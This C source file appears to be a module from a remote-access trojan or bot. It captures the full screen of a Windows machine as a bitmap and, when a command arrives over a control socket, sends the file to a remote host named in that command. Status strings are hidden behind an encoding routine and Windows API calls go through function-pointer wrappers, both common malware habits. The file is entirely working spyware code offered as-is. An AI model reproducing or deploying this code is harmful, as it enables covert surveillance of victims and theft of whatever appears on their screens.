#include "stuff.h"
#include "externals.h"

#ifndef NO_CAPTURE
#pragma comment(lib, "gdi32")

BOOL Capture(char *file)
{
	HDC hdc, hdc2;
	HBITMAP bitmap;
	BITMAPINFO bmpinfo;
	LPVOID pBits;
	DWORD dwWidth, dwHeight, dwBPP, dwNumColors, dwBytes;
	HGDIOBJ gdiobj;
	HANDLE hfile;

	hdc = CreateDC("DISPLAY", NULL, NULL, NULL);
	if(hdc == NULL)
		return FALSE;

	dwWidth = GetDeviceCaps(hdc, HORZRES);
	dwHeight = GetDeviceCaps(hdc, VERTRES);
	dwBPP = GetDeviceCaps(hdc, BITSPIXEL);

	if(dwBPP <= 8) 
	{
		dwNumColors = GetDeviceCaps(hdc, NUMCOLORS);
		dwNumColors = 256;
	} else
		dwNumColors = 0;

	hdc2 = CreateCompatibleDC(hdc);
	if(hdc2 == NULL) 
	{
		DeleteDC(hdc);
		return FALSE;
	}

	bmpinfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpinfo.bmiHeader.biWidth = dwWidth;
	bmpinfo.bmiHeader.biHeight = dwHeight;
	bmpinfo.bmiHeader.biPlanes = 1;
	bmpinfo.bmiHeader.biBitCount = (WORD) dwBPP;
	bmpinfo.bmiHeader.biCompression = BI_RGB;
	bmpinfo.bmiHeader.biSizeImage = 0;
	bmpinfo.bmiHeader.biXPelsPerMeter = 0;
	bmpinfo.bmiHeader.biYPelsPerMeter = 0;
	bmpinfo.bmiHeader.biClrUsed = dwNumColors;
	bmpinfo.bmiHeader.biClrImportant = dwNumColors;
	bitmap = CreateDIBSection(hdc, &bmpinfo, DIB_PAL_COLORS, &pBits, NULL, 0);

	if(bitmap == NULL) 
	{
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}
	gdiobj = SelectObject(hdc2, (HGDIOBJ)bitmap);
	if((gdiobj == NULL) || (gdiobj == (LPVOID)GDI_ERROR)) 
	{
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}
	if (!BitBlt(hdc2, 0,0, dwWidth, dwHeight, hdc, 0,0, SRCCOPY)) 
	{
		DeleteDC(hdc);
		DeleteDC(hdc2);
		return FALSE;
	}
	RGBQUAD colors[256];
	if(dwNumColors != 0) 
	{
		dwNumColors = GetDIBColorTable(hdc2, 0, dwNumColors, colors);
	}
	BITMAPFILEHEADER bitmapfileheader;
	BITMAPINFOHEADER bitmapinfoheader;
	bitmapfileheader.bfType = 0x4D42;
	bitmapfileheader.bfSize = ((dwWidth * dwHeight * dwBPP)/8) + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));
	bitmapfileheader.bfReserved1 = 0;
	bitmapfileheader.bfReserved2 = 0;
	bitmapfileheader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));
	bitmapinfoheader.biSize = sizeof(BITMAPINFOHEADER);
	bitmapinfoheader.biWidth = dwWidth;
	bitmapinfoheader.biHeight = dwHeight;
	bitmapinfoheader.biPlanes = 1;
	bitmapinfoheader.biBitCount = (WORD)dwBPP;
	bitmapinfoheader.biCompression = BI_RGB;
	bitmapinfoheader.biSizeImage = 0;
	bitmapinfoheader.biXPelsPerMeter = 0;
	bitmapinfoheader.biYPelsPerMeter = 0;
	bitmapinfoheader.biClrUsed = dwNumColors;
	bitmapinfoheader.biClrImportant = 0;

	hfile = CreateFile(file,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);

	if(hfile == INVALID_HANDLE_VALUE) 
	{
		DeleteObject(bitmap);
		DeleteDC(hdc2);
		DeleteDC(hdc);
		return FALSE;
	}

	WriteFile(hfile,&bitmapfileheader,sizeof(BITMAPFILEHEADER), &dwBytes, NULL);
	WriteFile(hfile,&bitmapinfoheader,sizeof(BITMAPINFOHEADER), &dwBytes, NULL);

	if(dwNumColors != 0)
		WriteFile(hfile,colors,sizeof(RGBQUAD)*dwNumColors,&dwBytes,NULL);

	WriteFile(hfile,pBits,(dwWidth*dwHeight*dwBPP)/8,&dwBytes,NULL);

	CloseHandle(hfile);
	DeleteObject(bitmap);
	DeleteDC(hdc2);
	DeleteDC(hdc);

	return TRUE;
}

int CAP_Screen(SOCKET sock, char *command, char *host)
{
	char	temp[MAX_PATH];
	char	*b;
	char	s;

	b = strtok(command, "\"");

	if (b != NULL)
		s = *b;

	b = strtok(NULL, "\"");
	if (b == NULL)
		return 0;

	if (s == '1')
		_snprintf(temp, sizeof(temp) - 1, "t.bmp");
	else
		_snprintf(temp, sizeof(temp) - 1, "%s", b);

	if (Capture(temp))
	{
		if (s == '1')
		{
			WIN32_FIND_DATA	FindFileData;
			HANDLE			hFind = INVALID_HANDLE_VALUE;

			hFind = fFindFirstFile(temp, &FindFileData);

			if (hFind == INVALID_HANDLE_VALUE) 
			{
#ifdef DEBUG
				printf("Invalid file handle. Error is %u.\n", fGetLastError());
#endif
				return 0;
			}

			if (!strcmp(FindFileData.cFileName, temp))
			{
				_snprintf(temp, sizeof(temp) - 1, "%d", FindFileData.nFileSizeLow);

				NET_Send(sock, CAPTURESEND, temp);
				FILES_SendAndGet(sock, FindFileData.cFileName, host, atoi(b), TRUE, TRUE);
			}
		}
		else
			NET_Send(sock, CAPTUREACTION, strings[Decode(s_success)].encoded);
	}
	else
		NET_Send(sock, CAPTUREACTION, strings[Decode(s_failed)].encoded);

	return 1;
}

#endif